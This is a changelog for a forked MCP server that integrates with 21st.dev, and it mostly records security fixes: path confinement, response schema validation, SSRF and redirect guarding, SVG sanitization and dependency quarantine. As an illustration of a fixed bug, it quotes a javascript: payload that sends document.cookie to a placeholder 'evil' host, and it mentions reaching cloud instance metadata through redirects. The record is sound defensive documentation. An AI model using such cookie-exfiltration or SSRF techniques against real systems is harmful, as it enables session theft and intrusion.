# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Fixed

- **`magic_component_refiner` did not work in any released 2.x version.** It called
  `PathValidator.validate(path, "/")`, and `path.resolve("/") + path.sep` is `"//"`, which no
  absolute path begins with — so every real path was refused and the tool returned an error
  before any I/O, blaming the API key. The suite was 398 green over it because
  `tool-contract.test.ts` asserts `tools/list` metadata and executes no tool. If you tried to
  refine a component with this package and were told to check your API key, the API key was
  not the problem.

### Security

- **Tool file access is confined to configured roots.** `Config.allowedRoots` defaults to the
  working directory and is set by `ALLOWED_ROOTS`, a `path.delimiter`-separated list accepted
  as an environment variable or as a CLI argument in the same forms as `MAX_FILE_SIZE` and
  `MAX_BODY_SIZE`. Every root is resolved to an absolute path at configuration time, and an empty root or the filesystem root is refused — the base that
  confines nothing cannot be configured. `PathValidator.validate` now takes a set of roots
  rather than one base, so `validate(path, "/")` — a legal call that disabled the whole check —
  is no longer expressible. `magic_component_builder` reports a refused path to the caller and
  logs it at `warn` naming the path, instead of swallowing it in a `catch {}` and sending an
  empty `fileContent`, and it applies the existing `maxFileSize` to a read that had no bound.
- **Every remote response is validated against a schema before any field of it is read.**
  `HttpClient.get`/`post` take a required `zod` schema and return a discriminated
  `HttpResult<T>` whose failure branch carries no `data` at all, replacing
  `(await response.json()) as T` — a cast, not a validation — and `null as T`, which let
  `ok === true` coexist with `data === null`. The schema runs on every path that yields a
  value; an error status no longer produces one.
- **Failures are reported by kind, never by remote text.** Seven `FailureKind`s each map to a
  constant client-facing message with no interpolation slot, so no response body, error message
  or `statusText` can reach the MCP client. The remote detail goes to the local log at `error`.
  This closes the `statusText` that `magic_logo_search` previously forwarded verbatim, and the
  refusal reasons that carried a remote-chosen hostname into the failed-query report.
- **Response bodies are size-bounded**, checked against `content-length` *and* against the
  accumulated bytes, because `content-length` is remote-supplied and may lie. A body declaring
  12 bytes ahead of 16 MB is abandoned one chunk past the limit rather than read whole.
- **The request deadline now covers the body read.** The abort timer was cleared once headers
  arrived, leaving a trickling body without one; a single such response stalled a whole
  `magic_logo_search` batch, including queries that had already succeeded.
- **Redirects are refused when a hop leaves the configured service origin**, on every hop
  rather than the first. `fetch` follows redirects by default, which made the origin of a body
  a property of the response chain rather than of the service that was asked.
- **The callback server refuses a request with no `Origin`.** Absence was treated as
  permission, so a plain loopback POST returned `200` and its payload reached the agent
  byte-identical. The localhost allowlist is now opt-in through `ALLOW_LOCALHOST_ORIGIN`
  rather than a default, so a page on the user's own dev server cannot answer.
- **The callback body is validated before it resolves anything**, so a raw string can no longer
  become a tool's whole output. A rejected body leaves the single-use window open for a
  legitimate reply.
- **The channel discriminator left the payload.** The `BROWSER_URL:` prefix is replaced by a
  discriminated result the callback cannot forge, and a callback-derived URL is emitted only
  when its scheme is `https` — a body of
  `BROWSER_URL:javascript:fetch('http://evil/'+document.cookie)` previously produced exactly
  that URL inside a markdown link.
- **SVG sanitization is parser-based** (`src/security/svg-sanitizer.ts`). Markup is parsed
  with Bun's native `HTMLRewriter` and re-emitted from an explicit allowlist of elements and
  attributes, replacing the regular-expression filter that 2.0.0 shipped. That filter was
  bypassed by 14 of 15 measured payloads and, because `.replace()` runs once, could *construct*
  a threat: removing an inner `<script>` joined the surrounding text into a working `<script>`
  the input never contained. Seven HIGH code-scanning alerts pointed at it.
- **The logo search response is validated** against a `zod` schema before any field is read.
  A body that cannot satisfy the schema fails that one query and issues no request derived
  from it. Only the consumed subset is described and unknown keys are tolerated, so an
  upstream field addition stays a compatible change.
- **The SVG fetch cannot reach internal hosts** (`src/security/url-guard.ts`). A URL is
  fetched only when its scheme is `https` and its host is neither a loopback name nor an IP
  literal in a loopback, link-local, private or reserved range. IPv4-mapped IPv6 is
  normalised first, so `::ffff:127.0.0.1` is refused in every spelling.
- **Redirects are followed manually, with the guard applied to every hop.** `fetch` defaults
  to following redirects, which made the guard a check on a string rather than on the request
  that leaves the process: a guard-approved host answering `302 Location:
  http://169.254.169.254/…` reached cloud instance metadata. Chains are bounded at 5 hops and
  relative locations are resolved before being guarded.
- **The generated component name is derived by allowlist.** `logo.title` was interpolated into
  a TypeScript identifier position, so a crafted title emitted a component carrying a live
  `fetch(...)` call into the user's project.
- **Text nodes escape `{` and `}` as well as `<` and `>`.** The sanitized SVG is interpolated
  into a JSX source file, where `{` opens an expression container holding arbitrary JavaScript.
- **A fail-closed sanitizer result is reported as a failure**, not as a found logo. An empty
  or fully-rejected SVG previously produced `() => ()`, which does not parse.

### Added

- **Every tool is executed through a real `McpServer` + `Client` pair** in
  `src/__tests__/server/tool-execution.test.ts`, asserting an observable result rather than the
  absence of an exception. The existing contract test checks `tools/list` metadata and executes
  nothing, which is how a completely broken tool survived 398 green tests. Confirmed to
  discriminate rather than merely pass: against the pre-story commit it is 7 pass / 1 fail, the
  one failure being the refiner.

### Changed

- Error objects now format usefully in the log. `Logger` JSON-stringified its arguments, and
  `JSON.stringify(new Error(...))` is `{}`, so every "the server log has the detail" line
  recorded nothing. Message, own properties, cause chain and top frames are now emitted, still
  passed through `LogSanitizer`.
- The SVG sanitizer moved from `src/http/` to `src/security/`, beside `log-sanitizer`,
  `path-validator`, `rate-limiter` and `shell-sanitizer`. Being the only sanitizer outside
  that directory is part of why it went unreviewed.
- Logo search entries are validated individually rather than as a whole array, so one
  unusable entry no longer fails a query whose consumed entry is well-formed.

### Removed

- `src/http/svg-sanitizer.ts` and its two test files. The regex implementation is deleted
  rather than deprecated — one left in the tree is one a future caller can import. All 11 of
  its unit assertions were absorbed into the new test file first.

## [2.0.0] - 2026-08-10

Full architectural refactor. **Breaking**: this release is Bun-only and drops every
Node.js entry point.

### Added

- Immutable configuration: parsed once at boot, Zod-validated, `Object.freeze()`d and
  distributed by dependency injection (`src/config.ts`)
- SVG sanitizer (`src/http/svg-sanitizer.ts`) — strips `<script>`, event handlers,
  `<foreignObject>`, `javascript:` URIs and external-content elements from fetched logos
- `degraded` health state (latency > 2000ms) reported by `magic_health_check`
- Pool-based concurrency in logo search — slots refill as soon as they free up, instead of
  waiting for a whole chunk to finish
- `unhandledRejection` handler and explicit graceful shutdown
- Property-based tests for log sanitization and SVG sanitization
- `typecheck` script (`tsc --noEmit`), now also enforced in CI

### Changed

- **Runtime is Bun-only** (`engines.bun >= 1.3.0`); `bun build` replaces esbuild
- Source reorganized by domain: `tools/`, `http/`, `callback/`, `security/`, `browser/`,
  with tests mirroring the tree under `src/__tests__/`
- All components receive their dependencies via constructor — no global singletons
- `BaseTool` is now generic over its schema (`z.ZodObject<z.ZodRawShape>`), replacing `any`
- HTTP retries use a fresh `AbortController` per attempt, so the timeout is per-attempt
  rather than shared across the whole retry chain; JSON parsing is failure-safe
- `CallbackServer` is a disposable single-use instance on an ephemeral port (`port: 0`),
  replacing the singleton with its IDLE/BUSY/SHUTDOWN state machine
- `BrowserDetector` uses static imports and is instantiated with an injected logger
- All logs go to **stderr** — `console.log` would corrupt the MCP JSON-RPC stream on stdout
- Shutdown sets `process.exitCode` instead of calling `process.exit()`, so logs can flush
- CI runs a single Bun job with actions pinned by commit SHA

### Removed

- **Node.js support**: `build:node` / `start:node` scripts and the Node CI job
- Dependencies: `esbuild`, `shx`, `open`, `@types/node`
- `SessionTokenManager` — dead code, since 21st.dev does not support a token in the callback
- API response cache (`ApiCache`) and the `CACHE_TTL` variable
- `src/utils/` (`console.ts`, `get-content-of-file.ts`, `session-token.ts`)
- `beforeExit` handler, which risked an exit loop

### Fixed

- `MAX_FILE_SIZE` documented default corrected to 1MB (it was documented as 10MB)
- README no longer documents removed Node.js scripts
- **The Docker build works again.** `bun install` at the builder stage ran the root package's
  `prepare` script — `bun run build` — before `COPY . .` had brought `src/` into the image, so
  the build died on `FileNotFound opening root directory "src"`. The install now passes
  `--ignore-scripts`; the real build still runs on the next line, once the sources are there.
  Skipping install scripts is also the standard defense against a malicious `postinstall`, and
  costs nothing here — no dependency in the tree declares one.

### Security

- **11 transitive CVEs remediated**, by bumping `@modelcontextprotocol/sdk` to `^1.30.0`
  and re-resolving the lockfile. Affected packages: `hono`, `@hono/node-server`,
  `fast-uri`, `ip-address`, `body-parser`. The vulnerable code paths sit in the SDK's HTTP
  transport, which a stdio server never loads — the exposure was latent rather than
  reachable, but it is now closed either way.
- **Release-age quarantine** — `bunfig.toml` sets `install.minimumReleaseAge = 604800`, so
  a version published less than seven days ago is never resolved. A compromised publish has
  to survive a week of public scrutiny before it can reach this project. It is a rolling
  quarantine, not a version pin.
- **Weekly dependency check** — `scripts/dep-check.sh` reports what a re-resolution would
  change and scans the resolved tree with `osv-scanner` and `trivy`, emitting one JSON event
  per line. It writes nothing, needs no credentials and contacts no hosted service, and it
  exits non-zero both on findings and on a scanner it could not run — a skipped scan never
  reads as a clean one. Optional systemd user units in `contrib/systemd/` run it weekly.
  The quarantine gates what enters the tree; this catches what has aged in place.

  Freshness covers the **whole resolved tree**, not just the five declared dependencies.
  The check copies `package.json` (with `scripts` stripped) and `bunfig.toml` into a
  temporary directory outside the working tree, re-resolves there with
  `bun install --lockfile-only --ignore-scripts`, and diffs the result against `bun.lock`
  keyed on the lockfile key — so a package that appears twice at different versions is not
  read as phantom drift. Because `bunfig.toml` travels with the copy, every reported update
  is one a real `bun install` would take today, cooldown included. This matters because
  `bun outdated` walks `package.json` and therefore can never see a transitive package:
  all five packages behind the CVEs remediated above are transitive, so the detector built
  for them was blind to exactly them.

  The `freshness` event reports `examined_count` (rows read from the recorded `bun.lock`,
  and nothing beyond that), `compared_count` (keys present in *both* lockfiles — what the
  diff could actually compare; subtract it from `examined_count` and what remains is
  exactly the number of keys only `bun.lock` holds), `outdated` (entries carrying `key`,
  `name`, `scope` as `direct`/`transitive`, `current` and `update`), `unmatched` (keys
  present in exactly one of the two lockfiles, each carrying `key`, `name`, a `direction`
  of `recorded_only` or `resolved_only`, and only the version the lockfile holding it
  records) and `not_taken` (published releases the re-resolution did not take, direct
  dependencies only, carrying `latest`). `not_taken` deliberately does not say *why* a
  release was skipped — out of range and inside the 7-day quarantine are indistinguishable
  to it. An offline run reports freshness as errored and exits 2: unknown is not clean.

  An unmatched key is a **finding**, so it exits 1 alongside vulnerabilities and available
  updates, and the summary counts it in `unmatched_count`. Nothing was published and no
  version moved: the committed lockfile and a fresh resolution disagree about which keys
  exist at all, which the check can only report because it now walks both key sets. It is
  not exit 2 — coverage was complete, the tree simply disagrees with itself.

- **Findings now fail the systemd unit.** `dep-check.service` no longer declares
  `SuccessExitStatus=1`, so a run that finds updates, vulnerabilities or lockfile drift
  registers as failed and appears in `systemctl --user --failed` until the next run or an
  explicit `systemctl --user reset-failed`. The timer keeps firing regardless. The exit
  code was declared as half of the reporting channel and was being silently swallowed.
- **Bun floor raised to 1.3.0**, in both `engines.bun` and both `Dockerfile` stages. 1.3.0
  is the first release that honors `install.minimumReleaseAge`; every 1.2.x accepts the key
  in silence and applies no cooldown at all, so the previous `>=1.2.0` promised a guarantee
  the runtime did not deliver.
- **Tool-contract guard** — `src/__tests__/server/tool-contract.test.ts` drives a real MCP
  client over an in-memory transport and pins the six advertised tool names plus each input
  schema's property names, required set and declared types. A future SDK bump cannot change
  the wire contract without failing the suite. Description text is deliberately left
  unpinned, so wording stays free to improve.

## [1.1.0] - 2026-02-04

### Added

#### Security
- Session token validation for callback requests (CSRF/replay attack prevention)
- Request body size limits (default 1MB, configurable via MAX_BODY_SIZE)
- Log sanitization for API keys, tokens, and sensitive headers
- SessionTokenManager for cryptographic token generation and validation

#### Performance
- API response caching with LRU eviction (default 100 entries, 5min TTL)
- Parallel SVG fetching in logo search (concurrency limit: 5)
- Callback server singleton pattern for reuse across tool calls
- ApiCache utility with configurable TTL and statistics tracking

#### Architecture
- BrowserDetector module extracted from CreateUiTool
- Standardized error response format across all tools
- Health check tool (`magic_health_check`) for monitoring server status
- Configuration documentation with priority order (CLI > Env > Defaults)

#### Testing
- Property-based tests for session token uniqueness (Property A1)
- Property-based tests for log redaction completeness (Property A4)
- Property-based tests for cache hit determinism (Property B1)
- Property-based tests for error format consistency (Property C1)
- Property-based tests for parallel fetch independence (Property B3)
- Comprehensive unit tests for all new utilities

### Changed

- BaseTool enhanced with `formatError()` and `generateErrorCode()` methods
- All tools updated to use standardized error responses
- CreateUiTool refactored to use BrowserDetector module
- LogoSearchTool updated with parallel fetching and partial failure handling
- CallbackServer enhanced with session tokens and body size limits
- Logger integrated with LogSanitizer for automatic redaction

### Security

- All callback requests now require valid session tokens
- Request bodies limited to prevent DoS attacks
- Sensitive data automatically redacted from logs
- API keys, tokens, and credentials protected in all log output

### Performance

- Repeated API requests served from cache (up to 5min TTL)
- Logo searches complete faster with parallel SVG fetching
- Callback server reuse reduces port allocation overhead
- Cache hit rates tracked for monitoring

## [1.0.0] - 2026-02-04

### Added

- Bun as primary runtime for faster builds and tests
- CI/CD with GitHub Actions (Bun + Node.js)
- Unit tests for `fetch-ui` and `refine-ui` tools
- Environment variable documentation (LOG_LEVEL, MAX_FILE_SIZE, TWENTY_FIRST_TIMEOUT, DEBUG)
- Node.js fallback scripts (`build:node`, `start:node`)
- Multi-stage Dockerfile for optimized container builds

### Changed

- Migrated from Jest to Bun's native test runner
- Updated Dockerfile to use `oven/bun:1` base image
- Simplified package.json scripts for Bun-first workflow
- Improved README with badges and clearer documentation

### Removed

- Jest, ts-jest, and @types/jest dependencies
- jest.config.js configuration file

### Fixed

- Version standardization (was 0.2.0 in index.ts, now 1.0.0)
- README clarification: `open` package is still used as browser fallback (not removed)

## Changes from Original Fork

This is a fork of [21st-dev/magic-mcp](https://github.com/21st-dev/magic-mcp) with the following modifications:

- **Direct API calls**: Replaced browser+callback mechanism with direct API calls
- **Gemini-compatible tool names**: Renamed tools to not start with numbers
- **Reduced dependencies**: Removed `cors`, `express` (not needed); `open` kept as browser fallback
- **Better error handling**: Added fallback mechanisms and improved logging
- **Security improvements**: Added rate limiting, path validation, shell sanitization
- **Kiro IDE compatibility**: Full support for Kiro IDE MCP configuration
